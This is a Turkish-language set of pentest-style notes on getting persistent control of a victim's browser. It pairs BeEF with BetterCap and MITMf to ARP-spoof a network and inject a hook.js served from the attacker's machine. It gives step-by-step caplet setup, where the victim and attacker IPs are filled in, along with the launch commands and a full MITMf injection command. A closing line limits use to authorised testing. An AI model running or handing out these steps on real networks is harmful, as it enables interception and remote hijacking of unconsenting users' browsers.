**📌 Temel Mantık:** 
Kurbanın tarayıcısına zararlı JavaScript kodu enjekte ederek, tarayıcı kapatılsa bile **kalıcı erişim** sağlamak.

*   🎯 **Problem:** Basit bir saldırıda, kurban tarayıcıyı kapattığında erişim kaybolur.
*   💡 **Çözüm:** Man-in-the-Middle (MitM) saldırısı ile zararlı JS kodu enjekte edilirse, kurbanın ziyaret ettiği tüm sitelerden bağımsız olarak **kalıcı bir arka kapı** oluşturulur.

---

### **🛠️ Yöntem 1: Beef Framework + BetterCap**

**🔧 Kullanılan Araç:** `beefcustom` caplet'i (BetterCap eklentisi).

**📋 Adımlar:**

1.  **📂 Caplet'i Yükle:**
    *   `beefcustom` klasörünü `/usr/share/bettercap/caplets/` yoluna kopyala.

2.  **⚙️ Dosyaları Yapılandır:**
    *   **`beefcustom.cap`** dosyasını aç ve `target.ip` kısmına **kurbanın IP adresini** yaz.
    *   **`beefcustom.js`** dosyasını aç. Son satırdaki `script` kodunun `src` kısmına **kendi IP adresini** (saldırgan makinenin IP'si) yaz.

3.  **🚀 Saldırıyı Başlat:**
    ```bash
    # BetterCap'ı başlat
    bettercap -iface [interface_adi]

    # Caplet'i çalıştır
    bettercap -iface [interface_adi] -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap
    ```
    *   ✅ **Sonuç:** Kurban herhangi bir tarayıcı kullandığı anda, Beef Framework'e bağlanır ve **kalıcı erişim** sağlanır.

---

### **🔄 Yöntem 2: MITMf Tool (Alternatif)**

**🔧 Kullanılan Araç:** `python mitmf.py` aracı.

**📋 Komut:**
```bash
python mitmf.py --arp --spoof --gateway [modem_ip] --target [kurban_ip] -i [interface_adi] --inject --js-url http://[saldırgan_ip]:3000/hook.js
```

*   ⚠️ **Dikkat:** Bu yöntem için Beef Framework'ün `3000` portunda çalışıyor olması gerekir. `hook.js` dosyasını sunmak için kullanılır.

---

### **🎯 Özet & Hatırlatmalar**

| Durum | Erişim Türü | Araç |
| :--- | :--- | :--- |
| **❌ Basit Saldırı** | Geçici (Tarayıcı kapanınca biter) | - |
| **✅ JS Enjeksiyonu** | **Kalıcı** (Tarayıcıdan bağımsız) | BetterCap + Beef |

*   🔄 **Beef Framework:** Kurbanın tarayıcısını uzaktan kontrol etmeye yarar.
*   ⚠️ **Etik Uyarı:** Bu bilgiler sadece **sızma testi** ve **savunma** amaçlı öğrenilmektedir. İzinsiz kullanım **yasa dışıdır**.

---